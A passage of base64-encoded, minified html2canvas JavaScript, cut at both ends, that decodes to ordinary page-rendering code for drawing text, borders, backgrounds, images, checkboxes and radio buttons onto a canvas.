ZpbHRlcihwZSh1ZSkpLG89ci5maWx0ZXIocGUobGUpKS5maWx0ZXIocGUocmUpKSxpPW4uZmlsdGVyKHBlKGxlKSkuZmlsdGVyKHVlKSxhPXIuZmlsdGVyKHBlKGxlKSkuZmlsdGVyKHJlKSxzPXQuY29udGV4dHMuY29uY2F0KHIuZmlsdGVyKGxlKSkuZmlsdGVyKG5lKSxjPXQuY2hpbGRyZW4uZmlsdGVyKG1lKS5maWx0ZXIoaWUpLGg9dC5jb250ZXh0cy5maWx0ZXIoZWUpO2UuY29uY2F0KG8pLmNvbmNhdChpKS5jb25jYXQoYSkuY29uY2F0KHMpLmNvbmNhdChjKS5jb25jYXQoaCkuZm9yRWFjaChmdW5jdGlvbih0KXt0aGlzLnJlbmRlclF1ZXVlLnB1c2godCksb2UodCkmJih0aGlzLnBhcnNlKHQpLHRoaXMucmVuZGVyUXVldWUucHVzaChuZXcgWSkpfSx0aGlzKX0sVS5wcm90b3R5cGUucGFpbnQ9ZnVuY3Rpb24odCl7dHJ5e3QgaW5zdGFuY2VvZiBZP3RoaXMucmVuZGVyZXIuY3R4LnJlc3RvcmUoKTptZSh0KT8oZ2UodC5wYXJlbnQpJiZ0LnBhcmVudC5hcHBlbmRUb0RPTSgpLHRoaXMucGFpbnRUZXh0KHQpLGdlKHQucGFyZW50KSYmdC5wYXJlbnQuY2xlYW5ET00oKSk6dGhpcy5wYWludE5vZGUodCl9Y2F0Y2goZSl7aWYoTihlKSx0aGlzLm9wdGlvbnMuc3RyaWN0KXRocm93IGV9fSxVLnByb3RvdHlwZS5wYWludE5vZGU9ZnVuY3Rpb24odCl7b2UodCkmJih0aGlzLnJlbmRlcmVyLnNldE9wYWNpdHkodC5vcGFjaXR5KSx0aGlzLnJlbmRlcmVyLmN0eC5zYXZlKCksdC5oYXNUcmFuc2Zvcm0oKSYmdGhpcy5yZW5kZXJlci5zZXRUcmFuc2Zvcm0odC5wYXJzZVRyYW5zZm9ybSgpKSksIklOUFVUIj09PXQubm9kZS5ub2RlTmFtZSYmImNoZWNrYm94Ij09PXQubm9kZS50eXBlP3RoaXMucGFpbnRDaGVja2JveCh0KToiSU5QVVQiPT09dC5ub2RlLm5vZGVOYW1lJiYicmFkaW8iPT09dC5ub2RlLnR5cGU/dGhpcy5wYWludFJhZGlvKHQpOnRoaXMucGFpbnRFbGVtZW50KHQpfSxVLnByb3RvdHlwZS5wYWludEVsZW1lbnQ9ZnVuY3Rpb24odCl7dmFyIGU9dC5wYXJzZUJvdW5kcygpO3RoaXMucmVuZGVyZXIuY2xpcCh0LmJhY2tncm91bmRDbGlwLGZ1bmN0aW9uKCl7dGhpcy5yZW5kZXJlci5yZW5kZXJCYWNrZ3JvdW5kKHQsZSx0LmJvcmRlcnMuYm9yZGVycy5tYXAoeGUpKX0sdGhpcyksdGhpcy5yZW5kZXJlci5jbGlwKHQuY2xpcCxmdW5jdGlvbigpe3RoaXMucmVuZGVyZXIucmVuZGVyQm9yZGVycyh0LmJvcmRlcnMuYm9yZGVycyl9LHRoaXMpLHRoaXMucmVuZGVyZXIuY2xpcCh0LmJhY2tncm91bmRDbGlwLGZ1bmN0aW9uKCl7c3dpdGNoKHQubm9kZS5ub2RlTmFtZSl7Y2FzZSJzdmciOmNhc2UiSUZSQU1FIjp2YXIgbj10aGlzLmltYWdlcy5nZXQodC5ub2RlKTtuP3RoaXMucmVuZGVyZXIucmVuZGVySW1hZ2UodCxlLHQuYm9yZGVycyxuKTpOKCJFcnJvciBsb2FkaW5nIDwiK3Qubm9kZS5ub2RlTmFtZSsiPiIsdC5ub2RlKTticmVhaztjYXNlIklNRyI6dmFyIHI9dGhpcy5pbWFnZXMuZ2V0KHQubm9kZS5zcmMpO3I/dGhpcy5yZW5kZXJlci5yZW5kZXJJbWFnZSh0LGUsdC5ib3JkZXJzLHIpOk4oIkVycm9yIGxvYWRpbmcgPGltZz4iLHQubm9kZS5zcmMpO2JyZWFrO2Nhc2UiQ0FOVkFTIjp0aGlzLnJlbmRlcmVyLnJlbmRlckltYWdlKHQsZSx0LmJvcmRlcnMse2ltYWdlOnQubm9kZX0pO2JyZWFrO2Nhc2UiU0VMRUNUIjpjYXNlIklOUFVUIjpjYXNlIlRFWFRBUkVBIjp0aGlzLnBhaW50Rm9ybVZhbHVlKHQpfX0sdGhpcyl9LFUucHJvdG90eXBlLnBhaW50Q2hlY2tib3g9ZnVuY3Rpb24odCl7dmFyIGU9dC5wYXJzZUJvdW5kcygpLG49TWF0aC5taW4oZS53aWR0aCxlLmhlaWdodCkscj17d2lkdGg6bi0xLGhlaWdodDpuLTEsdG9wOmUudG9wLGxlZnQ6ZS5sZWZ0fSxvPVszLDNdLGk9W28sbyxvLG9dLGE9WzEsMSwxLDFdLm1hcChmdW5jdGlvbih0KXtyZXR1cm57Y29sb3I6bmV3IEMoIiNBNUE1QTUiKSx3aWR0aDp0fX0pLHM9JChyLGksYSk7dGhpcy5yZW5kZXJlci5jbGlwKHQuYmFja2dyb3VuZENsaXAsZnVuY3Rpb24oKXt0aGlzLnJlbmRlcmVyLnJlY3RhbmdsZShyLmxlZnQrMSxyLnRvcCsxLHIud2lkdGgtMixyLmhlaWdodC0yLG5ldyBDKCIjREVERURFIikpLHRoaXMucmVuZGVyZXIucmVuZGVyQm9yZGVycyhHKGEscixzLGkpKSx0Lm5vZGUuY2hlY2tlZCYmKHRoaXMucmVuZGVyZXIuZm9udChuZXcgQygiIzQyNDI0MiIpLCJub3JtYWwiLCJub3JtYWwiLCJib2xkIixuLTMrInB4IiwiYXJpYWwiKSx0aGlzLnJlbmRlcmVyLnRleHQoIuKclCIsci5sZWZ0K24vNixyLnRvcCtuLTEpKX0sdGhpcyl9LFUucHJvdG90eXBlLnBhaW50UmFkaW89ZnVuY3Rpb24odCl7dmFyIGU9dC5wYXJzZUJvdW5kcygpLG49TWF0aC5taW4oZS53aWR0aCxlLmhlaWdodCktMjt0aGlzLnJlbmRlcmVyLmNsaXAodC5iYWNrZ3JvdW5kQ2xpcCxmdW5jdGlvbigpe3RoaXMucmVuZGVyZXIuY2lyY2xlU3Ryb2tlKGUubGVmdCsxLGUudG9wKzEsbixuZXcgQygiI0RFREVERSIpLDEsbmV3IEMoIiNBNUE1QTUiKSksdC5ub2RlLmNoZWNrZWQmJnRoaXMucmVuZGVyZXIuY2lyY2xlKE1hdGguY2VpbChlLmxlZnQrbi80KSsxLE1hdGguY2VpbChlLnRvcCtuLzQpKzEsTWF0aC5mbG9vcihuLzIpLG5ldyBDKCIjNDI0MjQyIikpfSx0aGlzKX0sVS5wcm90b3R5cGUucGFpbnRGb3JtVmFsdWU9ZnVuY3Rpb24odCl7dmFyIGU9dC5nZXRWYWx1ZSgpO2lmKGUubGVuZ3RoPjApe3ZhciBuPXQubm9kZS5vd25lckRvY3VtZW50LHI9bi5jcmVhdGVFbGVtZW50KCJodG1sMmNhbnZhc3dyYXBwZXIiKSxvPVsibGluZUhlaWdodCIsInRleHRBbGlnbiIsImZvbnRGYW1pbHkiLCJmb250V2VpZ2h0IiwiZm9udFNpemUiLCJjb2xvciIsInBhZGRpbmdMZWZ0IiwicGFkZGluZ1RvcCIsInBhZGRpbmdSaWdodCIsInBhZGRpbmdCb3R0b20iLCJ3aWR0aCIsImhlaWdodCIsImJvcmRlckxlZnRTdHlsZSIsImJvcmRlclRvcFN0eWxlIiwiYm9yZGVyTGVmdFdpZHRoIiwiYm9yZGVyVG9wV2lkdGgiLCJib3hTaXppbmciLCJ3aGl0ZVNwYWNlIiwid29yZFdyYXAiXTtvLmZvckVhY2goZnVuY3Rpb24oZSl7dHJ5e3Iuc3R5bGVbZV09dC5jc3MoZSl9Y2F0Y2gobil7TigiaHRtbDJjYW52YXM6IFBhcnNlOiBFeGNlcHRpb24gY2F1Z2h0IGluIHJlbmRlckZvcm1WYWx1ZTogIituLm1lc3NhZ2UpfX0pO3ZhciBpPXQucGFyc2VCb3VuZHMoKTtyLnN0eWxlLnBvc2l0aW9uPSJmaXhlZCIsci5zdHlsZS5sZWZ0PWkubGVmdCsicHgiLHIuc3R5bGUudG9wPWkudG9wKyJweCIsci50ZXh0Q29udGVudD1lLG4uYm9keS5hcHBlbmRDaGlsZChyKSx0aGlzLnBhaW50VGV4dChuZXcgSGUoci5maXJzdENoaWxkLHQpKSxuLmJvZHkucmVtb3ZlQ2hpbGQocil9fSxVLnByb3RvdHlwZS5wYWludFRleHQ9ZnVuY3Rpb24oZSl7ZS5hcHBseVRleHRUcmFuc2Zvcm0oKTt2YXIgbj10Lmh0bWwyY2FudmFzLnB1bnljb2RlLnVjczIuZGVjb2RlKGUubm9kZS5kYXRhKSxyPXRoaXMub3B0aW9ucy5sZXR0ZXJSZW5kZXJpbmcmJiFhZShlKXx8SWUoZS5ub2RlLmRhdGEpP24ubWFwKGZ1bmN0aW9uKGUpe3JldHVybiB0Lmh0bWwyY2FudmFzLnB1bnljb2RlLnVjczIuZW5jb2RlKFtlXSl9KTpDZShuKSxvPWUucGFyZW50LmZvbnRXZWlnaHQoKSxpPWUucGFyZW50LmNzcygiZm9udFNpemUiKSxhPWUucGFyZW50LmNzcygiZm9udEZhbWlseSIpLHM9ZS5wYXJlbnQucGFyc2VUZXh0U2hhZG93cygpO3RoaXMucmVuZGVyZXIuZm9udChlLnBhcmVudC5jb2xvcigiY29sb3IiKSxlLnBhcmVudC5jc3MoImZvbnRTdHlsZSIpLGUucGFyZW50LmNzcygiZm9udFZhcmlhbnQiKSxvLGksYSkscy5sZW5ndGg/dGhpcy5yZW5kZXJlci5mb250U2hhZG93KHNbMF0uY29sb3Isc1swXS5vZmZzZXRYLHNbMF0ub2Zmc2V0WSxzWzBdLmJsdXIpOnRoaXMucmVuZGVyZXIuY2xlYXJTaGFkb3coKSx0aGlzLnJlbmRlcmVyLmNsaXAoZS5wYXJlbnQuY2xpcCxmdW5jdGlvbigpe3IubWFwKHRoaXMucGFyc2VUZXh0Qm91bmRzKGUpLHRoaXMpLmZvckVhY2goZnVuY3Rpb24odCxuKXt0JiYodGhpcy5yZW5kZXJlci50ZXh0KHJbbl0sdC5sZWZ0LHQuYm90dG9tKSx0aGlzLnJlbmRlclRleHREZWNvcmF0aW9uKGUucGFyZW50LHQsdGhpcy5mb250TWV0cmljcy5nZXRNZXRyaWNzKGEsaSkpKX0sdGhpcyl9LHRoaXMpfSxVLnByb3RvdHlwZS5yZW5kZXJUZXh0RGVjb3JhdGlvbj1mdW5jdGlvbih0LGUsbil7c3dpdGNoKHQuY3NzKCJ0ZXh0RGVjb3JhdGlvbiIpLnNwbGl0KCIgIilbMF0pe2Nhc2UidW5kZXJsaW5lIjp0aGlzLnJlbmRlcmVyLnJlY3RhbmdsZShlLmxlZnQsTWF0aC5yb3VuZChlLnRvcCtuLmJhc2VsaW5lK24ubGluZVdpZHRoKSxlLndpZHRoLDEsdC5jb2xvcigiY29sb3IiKSk7YnJlYWs7Y2FzZSJvdmVybGluZSI6dGhpcy5yZW5kZXJlci5yZWN0YW5nbGUoZS5sZWZ0LE1hdGgucm91bmQoZS50b3ApLGUud2lkdGgsMSx0LmNvbG9yKCJjb2xvciIpKTticmVhaztjYXNlImxpbmUtdGhyb3VnaCI6dGhpcy5yZW5kZXJlci5yZWN0YW5nbGUoZS5sZWZ0LE1hdGguY2VpbChlLnRvcCtuLm1pZGRsZStuLmxpbmVXaWR0aCksZS53aWR0aCwxLHQuY29sb3IoImNvbG9yIikpfX07dmFyIG5uPXtpbnNldDpbWyJkYXJrZW4iLC42XSxbImRhcmtlbiIsLjFdLFsiZGFya2VuIiwuMV0sWyJkYXJrZW4iLC42XV19O1UucHJvdG90eXBlLnBhcnNlQm9yZGVycz1mdW5jdGlvbih0KXt2YXIgZT10LnBhcnNlQm91bmRzKCksbj1zZSh0KSxyPVsiVG9wIiwiUmlnaHQiLCJCb3R0b20iLCJMZWZ0Il0ubWFwKGZ1bmN0aW9uKGUsbil7dmFyIHI9dC5jc3MoImJvcmRlciIrZSsiU3R5bGUiKSxvPXQuY29sb3IoImJvcmRlciIrZSsiQ29sb3IiKTsiaW5zZXQiPT09ciYmby5pc0JsYWNrKCkmJihvPW5ldyBDKFsyNTUsMjU1LDI1NSxvLmFdKSk7dmFyIGk9bm5bcl0/bm5bcl1bbl06bnVsbDtyZXR1cm57d2lkdGg6dC5jc3NJbnQoImJvcmRlciIrZSsiV2lkdGgiKSxjb2xvcjppP29baVswXV0oaVsxXSk6byxhcmdzOm51bGx9fSksbz0kKGUsbixyKTtyZXR1cm57Y2xpcDp0aGlzLnBhcnNlQmFja2dyb3VuZENsaXAodCxvLHIsbixlKSxib3JkZXJzOkcocixlLG8sbil9fSxVLnByb3RvdHlwZS5wYXJzZUJhY2tncm91bmRDbGlwPWZ1bmN0aW9uKHQsZSxuLHIsbyl7dmFyIGk9dC5jc3MoImJhY2tncm91bmRDbGlwIiksYT1bXTtzd2l0Y2goaSl7Y2FzZSJjb250ZW50LWJveCI6Y2FzZSJwYWRkaW5nLWJveCI6WihhLHJbMF0sclsxXSxlLnRvcExlZnRJbm5lcixlLnRvcFJpZ2h0SW5uZXIsby5sZWZ0K25bM10ud2lkdGgsby50b3ArblswXS53aWR0aCksWihhLHJbMV0sclsyXSxlLnRvcFJpZ2h0SW5uZXIsZS5ib3R0b21SaWdodElubmVyLG8ubGVmdCtvLndpZHRoLW5bMV0ud2lkdGgsby50b3ArblswXS53aWR0aCksWihhLHJbMl0sclszXSxlLmJvdHRvbVJpZ2h0SW5uZXIsZS5ib3R0b21MZWZ0SW5uZXIsby5sZWZ0K28ud2lkdGgtblsxXS53aWR0aCxvLnRvcCtvLmhlaWdodC1uWzJdLndpZHRoKSxaKGEsclszXSxyWzBdLGUuYm90dG9tTGVmdElubmVyLGUudG9wTGVmdElubmVyLG8ubGVmdCtuWzNdLndpZHRoLG8udG9wK28uaGVpZ2h0LW5bMl0ud2lkdGgpO2JyZWFrO2RlZmF1bHQ6WihhLHJbMF0sclsxXSxlLnRvcExlZnRPdXRlcixlLnRvcFJpZ2h0T3V0ZXIsby5sZWZ0LG8udG9wKSxaKGEsclsxXSxyWzJdLGUudG9wUmlnaHRPdXRlcixlLmJvdHRvbVJpZ2h0T3V0ZXIsby5sZWZ0K28ud2lkdGgsby50b3ApLFooYSxyWzJdLHJbM10sZS5ib3R0b21SaWdodE91dGVyLGUuYm90dG9tTGVmdE91dGVyLG8ubGVmdCtvLndpZHRoLG8udG9wK28uaGVpZ2h0KSxaKGEsclszXSxyWzBdLGUuYm90dG9tTGVmdE91dGVyLGUudG9wTGVmdE91dGVyLG8ubGVmdCxvLnRvcCtvLmhlaWdodCl9cmV0dXJuIGF9O3ZhciBybj0wLG9uPSJ3aXRoQ3JlZGVudGlhbHMiaW4gbmV3IFhNTEh0dHBSZXF1ZXN0LGFuPSJjcm9zc09yaWdpbiJpbiBuZXcgSW1hZ2U7TmUucHJvdG90eXBlLmNsb25lVG89ZnVuY3Rpb24odCl7TmUucHJvdG90eXBlLmNsb25lVG8uY2FsbCh0aGlzLHQpLHQuaXNQc2V1ZG9FbGVtZW50PSEwLHQuYmVmb3JlPXRoaXMuYmVmb3JlfSxOZS5wcm90b3R5cGU9T2JqZWN0LmNyZWF0ZShELnByb3RvdHlwZSksTmUucHJvdG90eXBlLmFwcGVuZFRvRE9NPWZ1bmN0aW9uKCl7dGhpcy5iZWZvcmU/dGhpcy5wYXJlbnQubm9kZS5pbnNlcnRCZWZvcmUodGhpcy5ub2RlLHRoaXMucGFyZW50Lm5vZGUuZmlyc3RDaGlsZCk6dGhpcy5wYXJlbnQubm9kZS5hcHBlbmRDaGlsZCh0aGlzLm5vZGUpLHRoaXMucGFyZW50Lm5vZGUuY2xhc3NOYW1lKz0iICIrdGhpcy5nZXRIaWRlQ2xhc3MoKX0sTmUucHJvdG90eXBlLmNsZWFuRE9NPWZ1bmN0aW9uKCl7dGhpcy5ub2RlLnBhcmVudE5vZGUucmVtb3ZlQ2hpbGQodGhpcy5ub2RlKSx0aGlzLnBhcmVudC5ub2RlLmNsYXNzTmFtZT10aGlzLnBhcmVudC5ub2RlLmNsYXNzTmFtZS5yZXBsYWNlKHRoaXMuZ2V0SGlkZUNsYXNzKCksIiIpfSxOZS5wcm90b3R5cGUuZ2V0SGlkZUNsYXNzPWZ1bmN0aW9uKCl7cmV0dXJuIHRoaXNbIlBTRVVET19ISURFX0VMRU1FTlRfQ0xBU1NfIisodGhpcy5iZWZvcmU/IkJFRk9SRSI6IkFGVEVSIildfSxOZS5wcm90b3R5cGUuUFNFVURPX0hJREVfRUxFTUVOVF9DTEFTU19CRUZPUkU9Il9fX2h0bWwyY2FudmFzX19fcHNldWRvZWxlbWVudF9iZWZvcmUiLE5lLnByb3RvdHlwZS5QU0VVRE9fSElERV9FTEVNRU5UX0NMQVNTX0FGVEVSPSJfX19odG1sMmNhbnZhc19fX3BzZXVkb2VsZW1lbnRfYWZ0ZXIiLERlLnByb3RvdHlwZS5yZW5kZXJJbWFnZT1mdW5jdGlvbih0LGUsbixyKXt2YXIgbz10LmNzc0ludCgicGFkZGluZ0xlZnQiKSxpPXQuY3NzSW50KCJwYWRkaW5nVG9wIiksYT10LmNzc0ludCgicGFkZGluZ1JpZ2h0Iikscz10LmNzc0ludCgicGFkZGluZ0JvdHRvbSIpLGM9bi5ib3JkZXJzLGg9ZS53aWR0aC0oY1sxXS53aWR0aCtjWzNdLndpZHRoK28rYSksbD1lLmhlaWdodC0oY1swXS53aWR0aCtjWzJdLndpZHRoK2krcyk7dGhpcy5kcmF3SW1hZ2UociwwLDAsci5pbWFnZS53aWR0aHx8aCxyLmltYWdlLmhlaWdodHx8bCxlLmxlZnQrbytjWzNdLndpZHRoLGUudG9wK2krY1swXS53aWR0aCxoLGwpfSxEZS5wcm90b3R5cGUucmVuZGVyQmFja2dyb3VuZD1mdW5jdGlvbih0LGUsbil7ZS5oZWlnaHQ+MCYmZS53aWR0aD4wJiYodGhpcy5yZW5kZXJCYWNrZ3JvdW5kQ29sb3IodCxlKSx0aGlzLnJlbmRlckJhY2tncm91bmRJbWFnZSh0LGUsbikpfSxEZS5wcm90b3R5cGUucmVuZGVyQmFja2dyb3VuZENvbG9yPWZ1bmN0aW9uKHQsZSl7dmFyIG49dC5jb2xvcigiYmFja2dyb3VuZENvbG9yIik7bi5pc1RyYW5zcGFyZW50KCl8fHRoaXMucmVjdGFuZ2xlKGUubGVmdCxlLnRvcCxlLndpZHRoLGUuaGVpZ2h0LG4pfSxEZS5wcm90b3R5cGUucmVuZGVyQm9yZGVycz1mdW5jdGlvbih0KXt0LmZvckVhY2godGhpcy5yZW5kZXJCb3JkZXIsdGhpcyl9LERlLnByb3RvdHlwZS5yZW5kZXJCb3JkZXI9ZnVuY3Rpb24odCl7dC5jb2xvci5pc1RyYW5zcGFyZW50KCl8fG51bGw9PT10LmFyZ3N8fHRoaXMuZHJhd1NoYXBlKHQuYXJncyx0LmNvbG9yKX0sRGUucHJvdG90eXBlLnJlbmRlckJhY2tncm91bmRJbWFnZT1mdW5jdGlvbih0LGUsbil7dmFyIHI9dC5wYXJzZUJhY2tncm91bmRJbWFnZXMoKTtyLnJldmVyc2UoKS5mb3JFYWNoKGZ1bmN0aW9uKHIsbyxpKXtzd2l0Y2goci5tZXRob2Qpe2Nhc2UidXJsIjp2YXIgYT10aGlzLmltYWdlcy5nZXQoci5hcmdzWzBdKTthP3RoaXMucmVuZGVyQmFja2dyb3VuZFJlcGVhdGluZyh0LGUsYSxpLmxlbmd0aC0obysxKSxuKTpOKCJFcnJvciBsb2FkaW5nIGJhY2tncm91bmQtaW1hZ2UiLHIuYXJnc1swXSk7YnJlYWs7Y2FzZSJsaW5lYXItZ3JhZGllbnQiOmNhc2UiZ3JhZGllbnQiOnZhciBzPXRoaXMuaW1hZ2VzLmdldChyLnZhbHVlKTtzP3RoaXMucmVuZGVyQmFja2dyb3VuZEdyYWRpZW50KHMsZSxuKTpOKCJFcnJvciBsb2FkaW5nIGJhY2tncm91bmQtaW1hZ2UiLHIuYXJnc1swXSk7YnJlYWs7Y2FzZSJub25lIjpicmVhaztkZWZhdWx0Ok4oIlVua25vd24gYmFja2dyb3VuZC1pbWFnZSB0eXBlIixyLmFyZ3NbMF0pfX0sdGhpcyl9LERlLnByb3RvdHlwZS5yZW5kZXJCYWNrZ3JvdW5kUmVwZWF0aW5nPWZ1bmN0aW9uKHQsZSxuLHIsbyl7dmFyIGk9dC5wYXJzZUJhY2tncm91bmRTaXplKGUsbi5pbWFnZSxyKSxhPXQucGFyc2VCYWNrZ3JvdW5kUG9zaXRpb24oZSxuLmltYWdlLHIsaSkscz10LnBhcnNlQmFja2dyb3VuZFJlcGVhdChyKTtzd2l0Y2gocyl7Y2FzZSJyZXBlYXQteCI6Y2FzZSJyZXBlYXQgbm8tcmVwZWF0Ijp0aGlzLmJhY2tncm91bmRSZXBlYXRTaGFwZShuLGEsaSxlLGUubGVmdCtvWzNdLGUudG9wK2EudG9wK29bMF0sOTk5OTksaS5oZWlnaHQsbyk7YnJlYWs7Y2FzZSJyZXBlYXQteSI6Y2FzZSJuby1yZXBlYXQgcmVwZWF0Ijp0aGlzLmJhY2tncm91bmRSZXBlYXRTaGFwZShuLGEsaSxlLGUubGVmdCthLmxlZnQrb1szXSxlLnRvcCtvWzBdLGkud2lkdGgsOTk5OTksbyk7YnJlYWs7Y2FzZSJuby1yZXBlYXQiOnRoaXMuYmFja2dyb3VuZFJlcGVhdFNoYXBlKG4sYSxpLGUsZS5sZWZ0K2EubGVmdCtvWzNdLGUudG9wK2EudG9wK29bMF0saS53aWR0aCxpLmhlaWdodCxvKTticmVhaztkZWZhdWx0OnRoaXMucmVuZGVyQmFja2dyb3VuZFJlcGVhdChuLGEsaSx7dG9wOmUudG9wLGxlZnQ6ZS5sZWZ0fSxvWzNdLG9bMF0pfX0sQmUucHJvdG90eXBlPU9iamVjdC5jcmVhdGUoRC5wcm90b3R5cGUpLEJlLnByb3RvdHlwZS5nZXRQYXJlbnRTdGFjaz1mdW5jdGlvbih0KXt2YXIgZT10aGlzLnBhcmVudD90aGlzLnBhcmVudC5zdGFjazpudWxsO3JldHVybiBlP2Uub3duU3RhY2tpbmc/ZTplLmdldFBhcmVudFN0YWNrKHQpOnQuc3RhY2t9LF9lLnByb3RvdHlwZS50ZXN0UmFuZ2VCb3VuZHM9ZnVuY3Rpb24odCl7dmFyIGUsbixyLG8saT0hMTtyZXR1cm4gdC5jcmVhdGVSYW5nZSYmKGU9dC5jcmVhdGVSYW5nZSgpLGUuZ2V0Qm91bmRpbmdDbGllbnRSZWN0JiYobj10LmNyZWF0ZUVsZW1lbnQoImJvdW5kdGVzdCIpLG4uc3R5bGUuaGVpZ2h0PSIxMjNweCIsbi5zdHlsZS5kaXNwbGF5PSJibG9jayIsdC5ib2R5LmFwcGVuZENoaWxkKG4pLGUuc2VsZWN0Tm9kZShuKSxyPWUuZ2V0Qm91bmRpbmdDbGllbnRSZWN0KCksbz1yLmhlaWdodCwxMjM9PT1vJiYoaT0hMCksdC5ib2R5LnJlbW92ZUNoaWxkKG4pKSksaX0sX2UucHJvdG90eXBlLnRlc3RDT1JTPWZ1bmN0aW9uKCl7cmV0dXJuIGkhPT0obmV3IEltYWdlKS5jcm9zc09yaWdpbn0sX2UucHJvdG90eXBlLnRlc3RTVkc9ZnVuY3Rpb24oKXt2YXIgdD1uZXcgSW1hZ2Usbj1lLmNyZWF0ZUVsZW1lbnQoImNhbnZhcyIpLHI9bi5nZXRDb250ZXh0KCIyZCIpO3Quc3JjPSJkYXRhOmltYWdlL3N2Zyt4bWwsPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnPjwvc3ZnPiI7dHJ5e3IuZHJhd0ltYWdlKHQsMCwwKSxuLnRvRGF0YVVSTCgpfWNhdGNoKG8pe3JldHVybiExfXJldHVybiEwfSxGZS5wcm90b3R5cGUuaGFzRmFicmljPWZ1bmN0aW9uKCl7cmV0dXJuIGh0bWwyY2FudmFzLmZhYnJpYz9Qcm9taXNlLnJlc29sdmUoKTpQcm9taXNlLnJlamVjdChFcnJvcigiaHRtbDJjYW52YXMuc3ZnLmpzIGlzIG5vdCBsb2FkZWQsIGNhbm5vdCByZW5kZXIgc3ZnIikpfSxGZS5wcm90b3R5cGUuaW5saW5lRm9ybWF0dGluZz1mdW5jdGlvbih0KXtyZXR1cm4vXmRhdGE6aW1hZ2VcL3N2Z1wreG1sO2Jhc2U2NCwvLnRlc3QodCk/dGhpcy5kZWNvZGU2NCh0aGlzLnJlbW92ZUNvbnRlbnRUeXBlKHQpKTp0aGlzLnJlbW92ZUNvbnRlbnRUeXBlKHQpfSxGZS5wcm90b3R5cGUucmVtb3ZlQ29udGVudFR5cGU9ZnVuY3Rpb24odCl7cmV0dXJuIHQucmVwbGFjZSgvXmRhdGE6aW1hZ2VcL3N2Z1wreG1sKDtiYXNlNjQpPywvLCIiKX0sRmUucHJvdG90eXBlLmlzSW5saW5lPWZ1bmN0aW9uKHQpe3JldHVybi9eZGF0YTppbWFnZVwvc3ZnXCt4bWwvaS50ZXN0KHQpfSxGZS5wcm90b3R5cGUuY3JlYXRlQ2FudmFzPWZ1bmN0aW9uKHQpe3ZhciBlPXRoaXM7cmV0dXJuIGZ1bmN0aW9uKG4scil7dmFyIG89bmV3IGh0bWwyY2FudmFzLmZhYnJpYy5TdGF0aWNDYW52YXMoImMiKTtlLmltYWdlPW8ubG93ZXJDYW52YXNFbCxvLnNldFdpZHRoKHIud2lkdGgpLnNldEhlaWdodChyLmhlaWdodCkuYWRkKGh0bWwyY2FudmFzLmZhYnJpYy51dGlsLmdyb3VwU1ZHRWxlbWVudHMobixyKSkucmVuZGVyQWxsKCksdChvLmxvd2VyQ2FudmFzRWwpfX0sRmUucHJvdG90eXBlLmRlY29kZTY0PWZ1bmN0aW9uKGUpe3JldHVybiJmdW5jdGlvbiI9PXR5cGVvZiB0LmF0b2I/dC5hdG9iKGUpOmplKGUpfSxXZS5wcm90b3R5cGU9T2JqZWN0LmNyZWF0ZShGZS5wcm90b3R5cGUpLEhlLnByb3RvdHlwZT1PYmplY3QuY3JlYXRlKEQucHJvdG90eXBlKSxIZS5wcm90b3R5cGUuYXBwbHlUZXh0VHJhbnNmb3JtPWZ1bmN0aW9uKCl7dGhpcy5ub2RlLmRhdGE9dGhpcy50cmFuc2Zvcm0odGhpcy5wYXJlbnQuY3NzKCJ0ZXh0VHJhbnNmb3JtIikpfSxIZS5wcm90b3R5cGUudHJhbnNmb3JtPWZ1bmN0aW9uKHQpe3ZhciBlPXRoaXMubm9kZS5kYXRhO3N3aXRjaCh0KXtjYXNlImxvd2VyY2FzZSI6cmV0dXJuIGUudG9Mb3dlckNhc2UoKTtjYXNlImNhcGl0YWxpemUiOnJldHVybiBlLnJlcGxhY2UoLyhefFxzfDp8LXxcKHxcKSkoW2Etel0pL2csVmUpO2Nhc2UidXBwZXJjYXNlIjpyZXR1cm4gZS50b1VwcGVyQ2FzZSgpO2RlZmF1bHQ6cmV0dXJuIGV9fSx6ZS5wcm90b3R5cGU9T2JqZWN0LmNyZWF0ZShBLnByb3RvdHlwZSkscWUucHJvdG90eXBlPU9iamVjdC5jcmVhdGUoRGUucHJvdG90eXBlKSxxZS5wcm90b3R5cGUuc2V0RmlsbFN0eWxlPWZ1bmN0aW9uKHQpe3JldHVybiB0aGlzLmN0eC5maWxsU3R5bGU9Im9iamVjdCI9PXR5cGVvZiB0JiZ0LmlzQ29sb3I/IiIrdDp0LHRoaXMuY3R4fSxxZS5wcm90b3R5cGUucmVjdGFuZ2xlPWZ1bmN0aW9uKHQsZSxuLHIsbyl7dGhpcy5zZXRGaWxsU3R5bGUobykuZmlsbFJlY3QodCxlLG4scil9LHFlLnByb3RvdHlwZS5jaXJjbGU9ZnVuY3Rpb24odCxlLG4scil7dGhpcy5zZXRGaWxsU3R5bGUociksdGhpcy5jdHguYmVnaW5QYXRoKCksdGhpcy5jdHguYXJjKHQrbi8yLGUrbi8yLG4vMiwwLDIqTWF0aC5QSSwhMCksdGhpcy5jdHguY2xvc2VQYXRoKCksdGhpcy5jdHguZmlsbCgpfSxxZS5wcm90b3R5cGUuY2lyY2xlU3Ryb2tlPWZ1bmN0aW9uKHQsZSxuLHIsbyxpKXt0aGlzLmNpcmNsZSh0LGUsbixyKSx0aGlzLmN0eC5zdHJva2VTdHlsZT0iIitpLHRoaXMuY3R4LnN0cm9rZSgpfSxxZS5wcm90b3R5cGUuZHJhd1NoYXBlPWZ1bmN0aW9uKHQsZSl7dGhpcy5zaGFwZSh0KSx0aGlzLnNldEZpbGxTdHlsZShlKS5maWxsKCl9LHFlLnByb3RvdHlwZS50YWludHM9ZnVuY3Rpb24odCl7aWYobnVsbD09PXQudGFpbnRlZCl7dGhpcy50YWludEN0eC5kcmF3SW1hZ2UodC5pbWFnZSwwLDApO3RyeXt0aGlzLnRhaW50Q3R4LmdldEltYWdlRGF0YSgwLDAsMSwxKSx0LnRhaW50ZWQ9ITF9Y2F0Y2gobil7dGhpcy50YWludEN0eD1lLmNyZWF0ZUVsZW1lbnQoImNhbnZhcyIpLmdldENvbnRleHQoIjJkIiksdC50YWludGVkPSEwfX1yZXR1cm4gdC50YWludGVkfSxxZS5wcm90b3R5cGUuZHJhd0ltYWdlPWZ1bmN0aW9uKHQsZSxuLHIsbyxpLGEscyxjKXsoIXRoaXMudGFpbnRzKHQpfHx0aGlzLm9wdGlvbnMuYWxsb3dUYWludCkmJnRoaXMuY3R4LmRyYXdJbWFnZSh0LmltYWdlLGUsbixyLG8saSxhLHMsYyl9LHFlLnByb3RvdHlwZS5jbGlwPWZ1bmN0aW9uKHQs